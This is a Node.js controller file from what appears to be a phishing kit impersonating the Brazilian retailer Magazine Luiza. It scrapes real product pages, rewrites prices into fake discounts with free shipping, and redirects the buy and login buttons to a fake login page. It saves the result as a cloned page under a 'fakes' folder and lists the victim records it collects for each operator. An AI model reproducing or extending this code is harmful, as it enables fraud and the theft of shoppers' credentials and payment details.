const axios = require('axios');
const fs = require('fs');
const path = require('path');
const cheerio = require('cheerio');
const { v4 } = require('uuid');

const magaluModel = require('../models/Magalu.model');
const magaluUsersModel = require('../models/MagaluUsers.model');
const magaluInfoModel = require('../models/MagaluInfo.model');

exports.addProductMagalu = async (req, res, next) => {
    try {
        const { url } = req.body;
        var { amount, from, to } = req.body;

        var data = {};

        if (typeof url !== 'undefined' && typeof amount !== 'undefined' && typeof from !== 'undefined' && typeof to !== 'undefined') {

            from = parseFloat(from.replace(',', '.'));
            to = parseFloat(to.replace(',', '.'));
            amount = parseInt(amount);

            const interest = parseFloat(to / amount);


            const productmagalu = await axios.get(url, {
                headers: {
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36',
                },
            });
    
            if (productmagalu) {
                var page =  productmagalu.data;
                const $ = cheerio.load(page);

                const id = v4();
                
                $('.price-template__from').text('de R$ <%= from %>');
                $('.price-template__text').text('<%= to %>');

                $('.price-template__discount-text').text('DESCONTACO0');
                $('.price-price-template__discount-text--badges').text('DESCONTACO0');

                const title = $('.header-product__title').text();
                
                var interestClass = $('.price-template').html();
                var last = interestClass.split('</div>');
                
                $('.price-template').html(interestClass.replace(last[last.length - 1], ' em <%= amount %>x de R$ <%= interest %> sem juros'));

                $('.freight-product').html('<p style="color: green; margin-top: 20px;">Frete grátis</p>');
                $('.information-values__variation').html('');

                $('a').each((key, element) => {
                    if (typeof element.attribs['href'] !== 'undefined') {
                        if (element.attribs['href'][0] !== '#') {
                            element.attribs['href'] = '';
                        }
                        if (element.attribs['class'] === 'login-link') {
                            element.attribs['href'] = `/magalu/page/login/${id}`;
                        }
                        if (element.attribs['class'] === 'information-values__text-interation js-send-review') {
                            element.attribs['class'] = 'information-values__text-interation';
                        }
                    }
                });
                
                $('.seller__indentifier').html(`
                    <div class="seller__indentifier" itemprop="seller" itemscope="" itemtype="http://schema.org/Organization">
                        Entregue por <span class="seller__indentifier-magazine delivery_description--logo-magalu" role="logo" alt="magazineluiza"></span>
                    </div>
                `);

                $('input').each((key, element) => {
                    if (element.attribs['id'] === 'inpHeaderSearch') {
                        element.attribs['id'] = '';
                    }
                });

                $('.button__buy').each((key, element) => {
                    if (typeof element.attribs['data-product'] !== 'undefined') {
                        element.attribs['data-product'] = '{}';
                        element.attribs['class'] = 'button__buy button__buy-product-detail';
                        element.attribs['href'] = `/magalu/page/login/${id}`;
                        element.tagName = 'a';
                    }
                });

                $('.button__buy').html(`
                    <i class="button__icon icon-cart"></i> <span class="button__text">Adicionar à sacola</span>   
                `);

                $('.method-payment__card-luiza-box').each((key, element) => {
                    element.attribs['style'] = 'width: 50%;';
                });

                $('.button__similars').each((key, element) => {
                    element.attribs['class'] = 'button__similars product-review__btn-avaliation';
                });

                var html = $.html();

                html = html.replace('&lt;%= amount %&gt;', '<%= amount %>');
                html = html.replace('&lt;%= interest %&gt;', '<%= parseFloat(interest).toFixed(2).replace(\'.\', \',\') %>');
                html = html.replace('&lt;%= from %&gt;', '<%= parseFloat(from).toFixed(2).replace(\'.\', \',\') %>');
                html = html.replace('&lt;%= to %&gt;', '<%= parseFloat(to).toFixed(2).replace(\'.\', \',\') %>');
                html = html.replace('DESCONTACO0', '(<%= parseInt((to * 100 / from) - 100) %>% de desconto)');

                fs.writeFileSync(`${__dirname}/../views/fakes/magalu/${id}.ejs`, html);

                data = await magaluModel.create({
                    id_user: req.session.user.id,
                    page: id,
                    title: title,
                    user_id: req.session.user.id,
                    to: to,
                    from: from,
                    amount: amount,
                    interest: interest,
                });

                if (data) {
                    req.flash('notify', {
                        type: 'success',
                        message: 'Página clonada com sucesso!',
                    });
                }
            } else {
                req.flash('notify', {
                    type: 'success',
                    message: 'Não foi possível clonar a página!',
                });
            }
        }

        return res.render('layouts/main', {
            page: 'addproductmagalu',
            data: data,
        });
    } catch (err) {
        console.log(err);
        return res.render('errors/500');
    }
};

exports.deleteProductMagalu = async (req, res, next) => {
    try {
        const { id } = req.params;

        if (typeof id !== 'undefined') {
            const data = await magaluModel.findOne({
                where: {
                    id: id,
                    id_user: req.session.user.id,
                },
            });

            if (data) {
                const result = await magaluModel.destroy({
                    where: {
                        id: id,
                    },
                });
        
                if (result) {
                    req.flash('notify', {
                        type: 'success',
                        message: 'Produto deletado com sucesso!',
                    });
                } else {
                    req.flash('notify', {
                        type: 'error',
                        message: 'Não foi possível deletar o item!',
                    });
                }
            } else {
                req.flash('notify', {
                    type: 'error',
                    message: 'Não foi possível deletar o item!',
                });
            }

        } else {
            req.flash('notify', {
                type: 'error',
                message: 'Requisição inválida!',
            });
        }

        return res.redirect('list-products-magalu');
    } catch (err) {
        return res.render('errors/500');
    }
};

exports.listProductsMagalu = async (req, res, next) => {
    try {
        var { page } = req.query;

        page = parseInt(page) || 1;

        if (typeof page === 'undefined' || page < 1) {
            page = 1;
        }

        const data = await magaluModel.findAndCountAll({
            where: {
                id_user: req.session.user.id,
            },
            limit: 5,
            offset: (page - 1) * 5 || 0,    
        });
        
        return res.render('layouts/main', {
            page: 'listproductsmagalu',
            data: data,
        });
    } catch (err) {
        console.log(err);
        return res.render('errors/500');
    }
};

exports.magaluListInformations = async (req, res, next) => {
    try {
        var { page } = req.query;

        page = parseInt(page) || 1;

        if (typeof page === 'undefined' || page < 1) {
            page = 1;
        }

        const data = await magaluUsersModel.findAndCountAll({
            where: {
                user_id: req.session.user.id,
            },
            include: [{
                model: magaluInfoModel,
            }],
            limit: 5,
            offset: (page - 1) * 5 || 0,
        });

        return res.render('layouts/main', {
            page: 'informations',
            data: data,
        });
    } catch (err) {
        console.log(err);
        return res.render('errors/500');
    }
};